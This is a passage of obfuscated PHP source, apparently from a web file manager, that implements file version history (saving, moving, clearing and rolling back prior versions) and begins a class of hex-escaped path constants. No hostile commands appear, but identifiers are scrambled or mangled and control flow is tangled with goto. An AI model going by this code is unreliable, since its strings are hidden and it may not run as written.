($c‘¢â¥ŠÓù as $E„¶õ—Õ µ) { $BÕ²âÛŒâí = $E„¶õ—Õ µ[$AÉ´ÈÏ¦«²[75]]; if ($eÕÃ™ë†„) { $BÕ²âÛŒâí = self::copy($E„¶õ—Õ µ[$AÉ´ÈÏ¦«²[75]], $eÕÃ™ë†„, $AÉ´ÈÏ¦«²[790]); } else { $d«–Ôã‚¯‘ = self::init($E„¶õ—Õ µ[$AÉ´ÈÏ¦«²[75]]); if ($d«–Ôã‚¯‘->getType() == $AÉ´ÈÏ¦«²[105]) { $BÕ²âÛŒâí = $d«–Ôã‚¯‘->path; } } if ($BÕ²âÛŒâí && self::local()->exist($BÕ²âÛŒâí)) { $eÅ­ÀŒËô[$E„¶õ—Õ µ[$AÉ´ÈÏ¦«²[75]]] = $BÕ²âÛŒâí; } } if (!empty($eÅ­ÀŒËô)) { return array_values($eÅ­ÀŒËô); } show_json(LNG($AÉ´ÈÏ¦«²[1066]), !1); } public static function tmpFileName($BøìÏ¼ÙÄ) { $fÑÂ…µˆ¿¸ =& $_SERVER[…ë˜õ]; $F¾‘àí…ˆ = array($BøìÏ¼ÙÄ[$fÑÂ…µˆ¿¸[28]], $BøìÏ¼ÙÄ[$fÑÂ…µˆ¿¸[75]], $BøìÏ¼ÙÄ[$fÑÂ…µˆ¿¸[77]], $BøìÏ¼ÙÄ[$fÑÂ…µˆ¿¸[481]]); return md5(implode($fÑÂ…µˆ¿¸[70], $F¾‘àí…ˆ)); } private static function localFilePath($eñÜ‘¨éÈ„, $Cî‚Ì•«‚) { goto E†òÚëÑˆ; E–İêóñ Ö: if ($dç£¿Ã‹ƒ† == $aªŠĞäñ½[105] || $dç£¿Ã‹ƒ† == $aªŠĞäñ½[1106]) { if (!$A¼Š…¡ƒò¡->exist($A¼Š…¡ƒò¡->path)) { show_json(LNG($aªŠĞäñ½[104]), !1); } return $A¼Š…¡ƒò¡->path; } return !1; goto CÉ…†Î; EãÄĞ‡ÇÚ: if ($d©ñ„†™â[$aªŠĞäñ½[29]] == KodIO::KOD_SOURCE) { $aÁ‘§îßï = Model($aªŠĞäñ½[796])->fileInfoGet(KodIO::sourceID($eñÜ‘¨éÈ„)); if (!$aÁ‘§îßï[$aªŠĞäñ½[75]]) { show_json($aªŠĞäñ½[1105], !1); } $eñÜ‘¨éÈ„ = $aÁ‘§îßï[$aªŠĞäñ½[75]]; } $A¼Š…¡ƒò¡ = self::init($eñÜ‘¨éÈ„); $dç£¿Ã‹ƒ† = $A¼Š…¡ƒò¡->getType(); goto E–İêóñ Ö; E†òÚëÑˆ: $aªŠĞäñ½ =& $_SERVER[…ë˜õ]; if ($Cî‚Ì•«‚ == $aªŠĞäñ½[1103] && strtoupper(substr(PHP_OS, 0, 3)) == $aªŠĞäñ½[1104]) { return !1; } $d©ñ„†™â = KodIO::parse($eñÜ‘¨éÈ„); goto EãÄĞ‡ÇÚ; CÉ…†Î: } private static function archiveExt($cÇ–Ì××Òå = '') { $GLOBALS[$_SERVER[…ë˜õ][1107]] = $cÇ–Ì××Òå; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto a‡±¾±ÒÆ; a‡±¾±ÒÆ: $eêôîç¾Õ¢ =& $_SERVER[…ë˜õ]; $aÃÉèæ° = $GLOBALS[$eêôîç¾Õ¢[6]][$eêôîç¾Õ¢[87]][$eêôîç¾Õ¢[1108]]; if ($aÃÉèæ° <= 0) { return; } goto b˜Ó÷‘Æ‰; b˜Ó÷‘Æ‰: if (isset($_REQUEST[$eêôîç¾Õ¢[1109]]) && $_REQUEST[$eêôîç¾Õ¢[1109]] == $eêôîç¾Õ¢[86]) { return; } Hook::bind($eêôîç¾Õ¢[1110], $eêôîç¾Õ¢[1111]); Hook::bind($eêôîç¾Õ¢[1112], $eêôîç¾Õ¢[1113]); goto Ağå¨¢Š©; Ağå¨¢Š©: Hook::bind($eêôîç¾Õ¢[1114], $eêôîç¾Õ¢[1115]); Hook::bind($eêôîç¾Õ¢[1116], $eêôîç¾Õ¢[1117]); Hook::bind($eêôîç¾Õ¢[1118], $eêôîç¾Õ¢[1119]); goto a©ôô¹‰™; a©ôô¹‰™: Hook::bind($eêôîç¾Õ¢[1120], $eêôîç¾Õ¢[1121]); goto bé­‚Åá; bé­‚Åá: } public static function eventBeforeUpload($f÷¯È”Şç) { if ($f÷¯È”Şç[3] && $f÷¯È”Şç[3] != REPEAT_REPLACE) { return; } $C·ÂĞœ¸›Ÿ = self::parsePath($f÷¯È”Şç[0]); if (!$C·ÂĞœ¸›Ÿ) { return; } self::add($C·ÂĞœ¸›Ÿ); } public static function eventBeforeEdit($Dñ–ÊÎ¸ Ú) { $côš»ÈÌ©Ì = self::parsePath($Dñ–ÊÎ¸ Ú[0]); if (!$côš»ÈÌ©Ì) { return; } self::add($côš»ÈÌ©Ì); } public static function eventBeforeCopyFile($AÒäÔÚæ¨Û, $F·¿ÓÊÁÆ§, $f§Ã‹š¸ÄÛ, $dÂë³É¡¶, $B÷¤¾¦¼Œ, $BˆÔµÆ¤ó§) { $d‰öŞ§óÕÔ = $f§Ã‹š¸ÄÛ->getPathOuter($dÂë³É¡¶); $A¥ªöèçŞ¥ = self::parsePath($d‰öŞ§óÕÔ); if (!$A¥ªöèçŞ¥) { return; } self::add($A¥ªöèçŞ¥); } public static function eventBeforeRename($Eí†Æé„Œ) { $eŠµ£’øµ— =& $_SERVER[…ë˜õ]; $a¤‘¨‘´¼ç = self::parsePath($Eí†Æé„Œ[0]); if (!$a¤‘¨‘´¼ç) { return; } $fß¯ÔÆãÔ = self::checkInHistory($a¤‘¨‘´¼ç); if (!$fß¯ÔÆãÔ) { return; } if ($fß¯ÔÆãÔ[$eŠµ£’øµ—[29]] == $eŠµ£’øµ—[191]) { $bË—é×ßÍ‰ = self::listData($a¤‘¨‘´¼ç); if ($bË—é×ßÍ‰ && $bË—é×ßÍ‰[$eŠµ£’øµ—[365]]) { self::moveHistory($a¤‘¨‘´¼ç, $Eí†Æé„Œ[1]); } } else { IO::rename($fß¯ÔÆãÔ[$eŠµ£’øµ—[75]], $Eí†Æé„Œ[1]); } } public static function eventBeforeMove($CÚ©í¹‹¬¿) { goto dùÙœ“ã¬Î; B™Ï”õÄ’…: $CŠ°ÖÂ©‚í = self::parsePath($CÚ©í¹‹¬¿[1]); if (!$CŠ°ÖÂ©‚í) { return; } $E³Ş÷¢˜Ÿ = $CÚ©í¹‹¬¿[3]; goto a”£×ßô; a”£×ßô: $d¶„ğ†Åğ­ = self::checkInHistory($EÇåÉÅîÏƒ); if (!$d¶„ğ†Åğ­) { return; } $F…ìëŒÓ†¡ = self::pathHistory($CŠ°ÖÂ©‚í); goto FäÉ†Ş¦ÎŸ; FäÉ†Ş¦ÎŸ: if ($d¶„ğ†Åğ­[$E‘„ƒëÊ¤[29]] == $E‘„ƒëÊ¤[191]) { $d˜ÓÂïå  = self::listData($EÇåÉÅîÏƒ); $EÅìâ—óĞŒ = rtrim($CŠ°ÖÂ©‚í, $E‘„ƒëÊ¤[8]) . $E‘„ƒëÊ¤[8] . ($E³Ş÷¢˜Ÿ ? $E³Ş÷¢˜Ÿ : get_path_this($EÇåÉÅîÏƒ)); $aõ÷ï²Ì–É = self::listData($EÅìâ—óĞŒ); if ($d˜ÓÂïå  && $d˜ÓÂïå [$E‘„ƒëÊ¤[365]] && $aõ÷ï²Ì–É && $aõ÷ï²Ì–É[$E‘„ƒëÊ¤[365]]) { return self::clear($EÇåÉÅîÏƒ); } if ($d˜ÓÂïå  && $d˜ÓÂïå [$E‘„ƒëÊ¤[365]]) { self::moveHistory($EÇåÉÅîÏƒ, $E³Ş÷¢˜Ÿ, $F…ìëŒÓ†¡); } } else { IO::move($d¶„ğ†Åğ­[$E‘„ƒëÊ¤[75]], $F…ìëŒÓ†¡, !1, $E³Ş÷¢˜Ÿ); self::clearEmptyFolder(IO::pathFather($d¶„ğ†Åğ­[$E‘„ƒëÊ¤[75]])); } goto A‚‰„ªã; dùÙœ“ã¬Î: $E‘„ƒëÊ¤ =& $_SERVER[…ë˜õ]; $EÇåÉÅîÏƒ = self::parsePath($CÚ©í¹‹¬¿[0]); if (!$EÇåÉÅîÏƒ) { return; } goto B™Ï”õÄ’…; A‚‰„ªã: } public static function eventAfterRemove($e‘Ò ÙîÇ, $dÀƒ¤ÓÒ‚ø) { goto C Ä®¾‡Ï…; då×¾Ó„à: if ($aÏ†Êª‘ëÓ[$bŸ‚¾‰¿¸´[29]] == $bŸ‚¾‰¿¸´[191]) { $eÔÀ¤ƒëí = self::listData($BøùÖÏ…”, !1); if ($eÔÀ¤ƒëí && $eÔÀ¤ƒëí[$bŸ‚¾‰¿¸´[365]]) { self::clear($BøùÖÏ…”, !1); } } else { IO::remove($aÏ†Êª‘ëÓ[$bŸ‚¾‰¿¸´[75]]); self::clearEmptyFolder(IO::pathFather($aÏ†Êª‘ëÓ[$bŸ‚¾‰¿¸´[75]])); } goto fÖƒ¶µÌ™ï; AŒğİ—§ ¨: if (!$BøùÖÏ…”) { return; } $aÏ†Êª‘ëÓ = self::checkInHistory($BøùÖÏ…”); if (!$aÏ†Êª‘ëÓ) { return; } goto då×¾Ó„à; C Ä®¾‡Ï…: $bŸ‚¾‰¿¸´ =& $_SERVER[…ë˜õ]; if (!$dÀƒ¤ÓÒ‚ø) { return; } $BøùÖÏ…” = self::parsePath($e‘Ò ÙîÇ[0]); goto AŒğİ—§ ¨; fÖƒ¶µÌ™ï: } private static function checkInHistory($cò¾Õ­„ËÑ) { $DÕø×çˆ‰» = self::pathHistory($cò¾Õ­„ËÑ); if (!IO::exist($DÕø×çˆ‰»)) { $DÕø×çˆ‰» .= $_SERVER[…ë˜õ][1122]; } return IO::exist($DÕø×çˆ‰») ? IO::info($DÕø×çˆ‰») : !1; } private static function parsePath($E©ÀËªéóù) { goto F¢Î¥›ãó; F¢Î¥›ãó: $DïÉ®ç×Š =& $_SERVER[…ë˜õ]; if (!$E©ÀËªéóù) { return !1; } if ($GLOBALS[$DïÉ®ç×Š[1123]]) { return; } goto dù¸Íˆ˜; d¥ë’Áâ‹¨: if (!$BŒÆÒÕù²ˆ || !$aì­ÎåóØæ[$DïÉ®ç×Š[1124]]) { return !1; } if ($cÕÊğá©Çí == KodIO::KOD_SHARE_ITEM) { $D×ŠÕªİ´ƒ = IO::init($E©ÀËªéóù); if ($D×ŠÕªİ´ƒ->pathParse[$DïÉ®ç×Š[1053]]) { return self::parsePath($D×ŠÕªİ´ƒ->pathParse[$DïÉ®ç×Š[1053]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto aØ¥äáãğ¿; e–ßÑĞ«ç–: return $E©ÀËªéóù; goto a±ˆÀùÁ™è; dù¸Íˆ˜: $aì­ÎåóØæ = KodIO::parse($E©ÀËªéóù); $cÕÊğá©Çí = $aì­ÎåóØæ[$DïÉ®ç×Š[29]]; $BŒÆÒÕù²ˆ = !$cÕÊğá©Çí || $cÕÊğá©Çí == KodIO::KOD_IO || $cÕÊğá©Çí == KodIO::KOD_SHARE_ITEM; goto d¥ë’Áâ‹¨; aØ¥äáãğ¿: $eÅÕãÙñ¼Ê = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $DïÉ®ç×Š[1125]); foreach ($eÅÕãÙñ¼Ê as $a´Ã†Ì“©¯) { if (!$cÕÊğá©Çí && substr($E©ÀËªéóù, 0, strlen($a´Ã†Ì“©¯)) == $a´Ã†Ì“©¯) { return !1; } } self::log($GLOBALS[$DïÉ®ç×Š[1048]] . $DïÉ®ç×Š[1126] . $E©ÀËªéóù); goto e–ßÑĞ«ç–; a±ˆÀùÁ™è: } private static function pathHistory($B­íªµºŠİ) { $dÜ—É­¨Şà =& $_SERVER[…ë˜õ]; $e‘‘¸áĞ ê = self::$_historyBase . ltrim(KodIO::clear($B­íªµºŠİ), $dÜ—É­¨Şà[8]); $e‘‘¸áĞ ê = str_replace(array($dÜ—É­¨Şà[1127]), array($dÜ—É­¨Şà[1128]), $e‘‘¸áĞ ê); return $e‘‘¸áĞ ê; } public static function log($d™•ˆÉ’†Ö) { } public static function historyCount($bÃÛô—Ò) { $CÓÉÜöâ‚É =& $_SERVER[…ë˜õ]; $E¡ß®ïß­— = array(); $FÒø·¡› = array(); foreach ($bÃÛô—Ò as $f®¢›İù») { $F–³¹î¯ = get_path_father($f®¢›İù»); if (!$FÒø·¡›[$F–³¹î¯]) { $FÒø·¡›[$F–³¹î¯] = array(); } $FÒø·¡›[$F–³¹î¯][] = get_path_this($f®¢›İù»); } foreach ($FÒø·¡› as $F–³¹î¯ => $F¾ô¤ñÎÄÄ) { $dŞºàÈ±áã = self::parsePath($F–³¹î¯); if (!$dŞºàÈ±áã) { continue; } foreach ($F¾ô¤ñÎÄÄ as $fœğ†‹°¥Ø) { $Eš¶¼ä«ËÊ = self::listData(rtrim($dŞºàÈ±áã, $CÓÉÜöâ‚É[8]) . $CÓÉÜöâ‚É[8] . $fœğ†‹°¥Ø, !1); if ($Eš¶¼ä«ËÊ && $Eš¶¼ä«ËÊ[$CÓÉÜöâ‚É[365]]) { $E¡ß®ïß­—[rtrim($F–³¹î¯, $CÓÉÜöâ‚É[8]) . $CÓÉÜöâ‚É[8] . $fœğ†‹°¥Ø] = count($Eš¶¼ä«ËÊ[$CÓÉÜöâ‚É[365]]); } } } return $E¡ß®ïß­—; } public static function add($a¤Á›Õ×á) { goto bõÅÊ·Š¸; fš»…„¶¿ò: $a‡Üñèğªà = $fëíÄ…¼à…[$d–ô…µˆ›[365]]; if ($a®Çè™¤¿³[$d–ô…µˆ›[77]] == 0) { return; } if ($a®Çè™¤¿³[$d–ô…µˆ›[77]] >= 1024 * 1024 * 500) { return !1; } goto fİ”ªƒŒ„¾; AšÚÍ¦¥Í: if ($Fößá¤ÂÈ‹ <= 0) { return; } $Bá¥£œ Ó¼ = IO::hashSimple($a¤Á›Õ×á); $a®Çè™¤¿³ = IO::info($a¤Á›Õ×á); goto fš»…„¶¿ò; fİ”ªƒŒ„¾: if ($a‡Üñèğªà && $a‡Üñèğªà[0][$d–ô…µˆ›[170]] == $Bá¥£œ Ó¼) { return !0; } if (array_key_exists($d–ô…µˆ›[194], $a®Çè™¤¿³) && !$a®Çè™¤¿³[$d–ô…µˆ›[194]]) { return !1; } $D£à•­¨‰– = short_id(time()); goto fœÑª¹á÷; fœÑª¹á÷: $d˜Ÿ¾Ò…ğ = array($d–ô…µˆ›[388] => $D£à•­¨‰–, $d–ô…µˆ›[170] => $Bá¥£œ Ó¼, $d–ô…µˆ›[28] => $a®Çè™¤¿³[$d–ô…µˆ›[28]] . $d–ô…µˆ›[94] . date($d–ô…µˆ›[1132]) . rand_string(1), $d–ô…µˆ›[77] => $a®Çè™¤¿³[$d–ô…µˆ›[77]], $d–ô…µˆ›[426] => USER_ID, $d–ô…µˆ›[192] => time(), $d–ô…µˆ›[1133] => $d–ô…µˆ›[33]); IO::mkdir($fëíÄ…¼à…[$d–ô…µˆ›[1134]]); $a˜Å®£ø¡¡ = IO::copy($a¤Á›Õ×á, $fëíÄ…¼à…[$d–ô…µˆ›[1134]], !1, $d˜Ÿ¾Ò…ğ[$d–ô…µˆ›[28]]); goto e­ÌêÅ±Œ›; AƒŸÚ ¾Ø: return self::saveData($fëíÄ…¼à…[$d–ô…µˆ›[1135]], $a‡Üñèğªà); goto a±ÅË„ÅŞÂ; bõÅÊ·Š¸: $d–ô…µˆ› =& $_SERVER[…ë˜õ]; $fëíÄ…¼à… = self::listData($a¤Á›Õ×á); if (!$fëíÄ…¼à…) { return; } goto e²ÒÆ¢Áô; e­ÌêÅ±Œ›: if (!$a˜Å®£ø¡¡) { self::clearEmptyFolder($fëíÄ…¼à…[$d–ô…µˆ›[1134]]); return !1; } array_unshift($a‡Üñèğªà, $d˜Ÿ¾Ò…ğ); if (count($a‡Üñèğªà) > $A…ö²øì‰) { $F˜®†á°ö» = array_slice($a‡Üñèğªà, $A…ö²øì‰); foreach ($F˜®†á°ö» as $fªàÂ±Ÿ¹‰) { IO::remove($fëíÄ…¼à…[$d–ô…µˆ›[1134]] . $fªàÂ±Ÿ¹‰[$d–ô…µˆ›[28]]); } $a‡Üñèğªà = array_slice($a‡Üñèğªà, 0, $A…ö²øì‰); } goto AƒŸÚ ¾Ø; e²ÒÆ¢Áô: $BóÚÜØ±‡ = Model($d–ô…µˆ›[1129])->get($d–ô…µˆ›[1130]); $Fößá¤ÂÈ‹ = $GLOBALS[$d–ô…µˆ›[6]][$d–ô…µˆ›[87]][$d–ô…µˆ›[1108]]; $A…ö²øì‰ = $BóÚÜØ±‡ == $d–ô…µˆ›[1131] ? 5 : $Fößá¤ÂÈ‹; goto AšÚÍ¦¥Í; a±ÅË„ÅŞÂ: } public static function remove($D¼Æ¢Í†, $d¹Ç±Ç×–è) { $fÌá½ß°³š =& $_SERVER[…ë˜õ]; $dÍÂ‡‚õ Ì = self::listData($D¼Æ¢Í†); $dÄ®¢‚™åã = array(); if (!$dÍÂ‡‚õ Ì) { return !1; } foreach ($dÍÂ‡‚õ Ì[$fÌá½ß°³š[365]] as $FÂõ‘»ø„ô) { if ($FÂõ‘»ø„ô[$fÌá½ß°³š[388]] == $d¹Ç±Ç×–è) { IO::remove($dÍÂ‡‚õ Ì[$fÌá½ß°³š[1134]] . $FÂõ‘»ø„ô[$fÌá½ß°³š[28]]); continue; } $dÄ®¢‚™åã[] = $FÂõ‘»ø„ô; } return self::saveData($dÍÂ‡‚õ Ì[$fÌá½ß°³š[1135]], $dÄ®¢‚™åã); } public static function clear($bòê ò¨éÅ, $BÓ ©Ä˜² = true) { $Fã¥ÔÓ³Ò =& $_SERVER[…ë˜õ]; $E¾Í«³¤Á = self::listData($bòê ò¨éÅ, $BÓ ©Ä˜²); if (!$E¾Í«³¤Á) { return !1; } foreach ($E¾Í«³¤Á[$Fã¥ÔÓ³Ò[365]] as $A³È££î™) { IO::remove($E¾Í«³¤Á[$Fã¥ÔÓ³Ò[1134]] . $A³È££î™[$Fã¥ÔÓ³Ò[28]]); } return self::saveData($E¾Í«³¤Á[$Fã¥ÔÓ³Ò[1135]], array()); } public static function moveHistory($D­¡‹Í‹ÂÙ, $dŸ¶Ş‡Áî = '', $eŸªŠÊ‹ğ¬ = '') { goto bÓğé—£öœ; bÓğé—£öœ: $B„²áâ‚Ğœ =& $_SERVER[…ë˜õ]; $eŠšÇº“„ = self::listData($D­¡‹Í‹ÂÙ, !1); if (!$eŠšÇº“„ || !$eŠšÇº“„[$B„²áâ‚Ğœ[365]]) { return !1; } goto cùÜù¦ÔÍõ; cùÜù¦ÔÍõ: $b†‚‰›×² = $B„²áâ‚Ğœ[1122]; $dŸ¶Ş‡Áî = $dŸ¶Ş‡Áî ? $dŸ¶Ş‡Áî : get_path_this($D­¡‹Í‹ÂÙ); $eŸªŠÊ‹ğ¬ = $eŸªŠÊ‹ğ¬ ? $eŸªŠÊ‹ğ¬ : $eŠšÇº“„[$B„²áâ‚Ğœ[1134]]; goto A‘À‚ÌÅ´í; A‘À‚ÌÅ´í: $d¢¨Æê«õÜ = substr(get_path_this($eŠšÇº“„[$B„²áâ‚Ğœ[1135]]), 0, -strlen($b†‚‰›×²)); foreach ($eŠšÇº“„[$B„²áâ‚Ğœ[365]] as $Cˆóï¤œãÙ => $A‹°›£ÑË) { $EšâÔ† ê = $dŸ¶Ş‡Áî . substr($A‹°›£ÑË[$B„²áâ‚Ğœ[28]], strlen($d¢¨Æê«õÜ)); $AòŸ¥µ†® = IO::move($eŠšÇº“„[$B„²áâ‚Ğœ[1134]] . $A‹°›£ÑË[$B„²áâ‚Ğœ[28]], $eŸªŠÊ‹ğ¬, !1, $EšâÔ† ê); if ($AòŸ¥µ†®) { $eŠšÇº“„[$B„²áâ‚Ğœ[365]][$Cˆóï¤œãÙ][$B„²áâ‚Ğœ[28]] = $EšâÔ† ê; } } $eŠšÇº“„[$B„²áâ‚Ğœ[1135]] = IO::move($eŠšÇº“„[$B„²áâ‚Ğœ[1135]], $eŸªŠÊ‹ğ¬, !1, $dŸ¶Ş‡Áî . $b†‚‰›×²); goto A¶‡ï£ĞÎÁ; A¶‡ï£ĞÎÁ: self::saveData($eŠšÇº“„[$B„²áâ‚Ğœ[1135]], $eŠšÇº“„[$B„²áâ‚Ğœ[365]]); self::clearEmptyFolder($eŠšÇº“„[$B„²áâ‚Ğœ[1134]]); goto FùéÊÆï; FùéÊÆï: } public static function rollback($C¢ò«¼ù¿à, $eÊ±î‘Å) { $Aéàí½Ú =& $_SERVER[…ë˜õ]; $Béóö’×§ = self::listData($C¢ò«¼ù¿à); if (!$Béóö’×§) { return; } $dˆåÖ¥šÕ = IO::info($C¢ò«¼ù¿à); foreach ($Béóö’×§[$Aéàí½Ú[365]] as $b‰ùŸ’Ù¹‰ => $c†–Ş²Á‡Ê) { if ($c†–Ş²Á‡Ê[$Aéàí½Ú[388]] == $eÊ±î‘Å) { self::add($C¢ò«¼ù¿à); $a®ª¶ÃÅÇŸ = $Béóö’×§[$Aéàí½Ú[1134]] . $c†–Ş²Á‡Ê[$Aéàí½Ú[28]]; $BÉø¨º­ù‘ = IO::copy($a®ª¶ÃÅÇŸ, IO::pathFather($C¢ò«¼ù¿à), REPEAT_REPLACE, $dˆåÖ¥šÕ[$Aéàí½Ú[28]]); if ($BÉø¨º­ù‘) { self::remove($C¢ò«¼ù¿à, $eÊ±î‘Å); } return $BÉø¨º­ù‘; } } return !1; } public static function setDetail($c„’¯À´–°, $FÉ•î’¨Ë‰, $b¯‡ùŒ´ã¼) { $b×ÔÙ =& $_SERVER[…ë˜õ]; $aÖ²¢İÑö£ = self::listData($c„’¯À´–°); if (!$aÖ²¢İÑö£) { return; } foreach ($aÖ²¢İÑö£[$b×ÔÙ[365]] as $b˜ìÍÓª§Õ => $BÅøËêˆğ„) { if ($BÅøËêˆğ„[$b×ÔÙ[388]] == $FÉ•î’¨Ë‰) { $aÖ²¢İÑö£[$b×ÔÙ[365]][$b˜ìÍÓª§Õ][$b×ÔÙ[1133]] = $b¯‡ùŒ´ã¼; self::saveData($aÖ²¢İÑö£[$b×ÔÙ[1135]], $aÖ²¢İÑö£[$b×ÔÙ[365]]); return !0; } } return !1; } public static function fileInfo($bİœ¾†Ôõƒ, $D«Öó›¸á¦) { goto fŞ¾Û—ê¯Á; fŞ¾Û—ê¯Á: $F¤“¢¿¸Ò =& $_SERVER[…ë˜õ]; $FÓöÇ Œ”À = self::listData($bİœ¾†Ôõƒ); if (!$FÓöÇ Œ”À) { show_json(LNG($F¤“¢¿¸Ò[104]), !1); } goto E Â×ƒïÜÕ; F…Î‘ÜÇŒ: return IO::info($eã”“¨Èí); goto CÎˆèØ¶ç; E Â×ƒïÜÕ: $eã”“¨Èí = $F¤“¢¿¸Ò[33]; foreach ($FÓöÇ Œ”À[$F¤“¢¿¸Ò[365]] as $Cˆ¯Ú‹ÛÈ => $aŒŒÔ‡–é) { if ($aŒŒÔ‡–é[$F¤“¢¿¸Ò[388]] != $D«Öó›¸á¦) { continue; } $eã”“¨Èí = $FÓöÇ Œ”À[$F¤“¢¿¸Ò[1134]] . $aŒŒÔ‡–é[$F¤“¢¿¸Ò[28]]; break; } if (!$eã”“¨Èí) { show_json(LNG($F¤“¢¿¸Ò[104]), !1); } goto F…Î‘ÜÇŒ; CÎˆèØ¶ç: } public static function fileOut($C‚•Ê É—Ã, $bÎÛœ»ÁÍ•, $d«ÛÂÄñæ = false) { $a÷ŠÚ¨ƒôĞ =& $_SERVER[…ë˜õ]; $D¾§ÇØ°• = self::fileInfo($C‚•Ê É—Ã, $bÎÛœ»ÁÍ•); $Bë£ÚØ»ï =& $GLOBALS[$a÷ŠÚ¨ƒôĞ[7]]; $d«ÛÂÄñæ = isset($Bë£ÚØ»ï[$a÷ŠÚ¨ƒôĞ[1099]]) && $Bë£ÚØ»ï[$a÷ŠÚ¨ƒôĞ[1099]] == 1; if (isset($Bë£ÚØ»ï[$a÷ŠÚ¨ƒôĞ[29]]) && $Bë£ÚØ»ï[$a÷ŠÚ¨ƒôĞ[29]] == $a÷ŠÚ¨ƒôĞ[1136]) { return IO::fileOutImage($D¾§ÇØ°•[$a÷ŠÚ¨ƒôĞ[75]], $Bë£ÚØ»ï[$a÷ŠÚ¨ƒôĞ[1137]]); } IO::fileOut($D¾§ÇØ°•[$a÷ŠÚ¨ƒôĞ[75]], $d«ÛÂÄñæ, get_path_this($C‚•Ê É—Ã)); } public static function listData($E îÄÂÆŞÏ, $CÛ´á”ä¶¥ = true) { goto cÜù¡ÜÈùÇ; f©ôŒªÏæ: $cÍÇë‹Ä = IO::getContent($fÓÊïğœø¹[$Bã¾¨—½³å[1135]]); if ($cÍÇë‹Ä) { $a‡¬¢éá‚¨ = json_decode($cÍÇë‹Ä, !0); if (is_array($a‡¬¢éá‚¨)) { $fÓÊïğœø¹[$Bã¾¨—½³å[365]] = $a‡¬¢éá‚¨; } } return $fÓÊïğœø¹; goto FÍÕ‘›•Çì; cÜù¡ÜÈùÇ: $Bã¾¨—½³å =& $_SERVER[…ë˜õ]; if ($CÛ´á”ä¶¥ && !IO::exist($E îÄÂÆŞÏ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto Bö»”¥í±; Bö»”¥í±: if (substr($E îÄÂÆŞÏ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $f÷®¾²©‰ = self::pathHistory($E îÄÂÆŞÏ); $fÓÊïğœø¹ = array($Bã¾¨—½³å[1135] => $f÷®¾²©‰ . $Bã¾¨—½³å[1122], $Bã¾¨—½³å[1134] => rtrim(get_path_father($f÷®¾²©‰), $Bã¾¨—½³å[8]) . $Bã¾¨—½³å[8], $Bã¾¨—½³å[365] => array()); goto f©ôŒªÏæ; FÍÕ‘›•Çì: } private static function saveData($A¨³Ş’î¿, $cöœœŒÑË×) { goto C¥á³×–ƒí; b·ï©Û»ä: $A‰÷‡ò‡´ = IO::pathFather($A¨³Ş’î¿); IO::remove($A¨³Ş’î¿); self::clearEmptyFolder($A‰÷‡ò‡´); goto a†ĞÛß–£; C¥á³×–ƒí: $e·–ÂáÖë§ =& $_SERVER[…ë˜õ]; self::log($e·–ÂáÖë§[1138] . $A¨³Ş’î¿ . $e·–ÂáÖë§[67] . count($cöœœŒÑË×), $e·–ÂáÖë§[733]); if ($cöœœŒÑË×) { return IO::setContent($A¨³Ş’î¿, json_encode($cöœœŒÑË×)); } goto b·ï©Û»ä; a†ĞÛß–£: return !0; goto bÅ²õß¬ˆ§; bÅ²õß¬ˆ§: } public static function clearEmptyFolder($Cš¤¨Æ) { goto B •¹ö—Ì; B •¹ö—Ì: $dìâ®Ù—ß‚ =& $_SERVER[…ë˜õ]; if (trim($Cš¤¨Æ, $dìâ®Ù—ß‚[8]) == trim(self::$_historyBase, $dìâ®Ù—ß‚[8])) { return; } $eÖÃ‘»»£  = IO::pathFather($Cš¤¨Æ); goto AÚ¾Æ½¬œ; Eñ‡òËÎŞ: self::clearEmptyFolder($eÖÃ‘»»£ ); goto a½‡ğ­À‚; AÚ¾Æ½¬œ: $DÎˆ°ï¯¹Î = IO::has($Cš¤¨Æ, !0); if ($DÎˆ°ï¯¹Î[$dìâ®Ù—ß‚[201]] > 0 || $DÎˆ°ï¯¹Î[$dìâ®Ù—ß‚[202]] > 0) { return; } IO::remove($Cš¤¨Æ); goto Eñ‡òËÎŞ; a½‡ğ­À‚: } private static function getBasePath() { goto D„²­êÔ°×; D„²­êÔ°×: $Aƒ¾Ï…É¤ =& $_SERVER[…ë˜õ]; $cÂ¬ç¼» Û = Model($Aƒ¾Ï…É¤[1139])->get($Aƒ¾Ï…É¤[1140]); if (IO::exist($cÂ¬ç¼» Û)) { return $cÂ¬ç¼» Û; } goto dÄ¦§‰²Õ; dÄ¦§‰²Õ: $cÂ¬ç¼» Û = DATA_PATH . $Aƒ¾Ï…É¤[1141]; $cÂ¬ç¼» Û = IO::mkdir($cÂ¬ç¼» Û); $cÂ¬ç¼» Û = rtrim($cÂ¬ç¼» Û, $Aƒ¾Ï…É¤[8]) . $Aƒ¾Ï…É¤[8]; goto dš” º¸Ø; dš” º¸Ø: file_put_contents($cÂ¬ç¼» Û . $Aƒ¾Ï…É¤[1142], $Aƒ¾Ï…É¤[33]); Model($Aƒ¾Ï…É¤[1139])->set($Aƒ¾Ï…É¤[1140], $cÂ¬ç¼» Û); return $cÂ¬ç¼» Û; goto e…‡˜¬î¹; e…‡˜¬î¹: } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\162\122\145\143\x79\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\163\x65\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\x72\106\151\x6c\x65\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\151\x6c\x65\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\160\x52\157\157\164\123\x65\154\x66\x7d"; const KOD_USER_SHARE = "\173\x75\x73\x65\x72\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\x72\123\150\x61\x72\x65\114\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\145\x54\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\145\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\173\x73\150\x61\162\x65\111\x74\145\x6d\x4c\151\x6e\x6b\x7d"; const KOD_SEARCH = "\173\163\145\x61\x72\143\150\175"; const KOD_BLOCK = 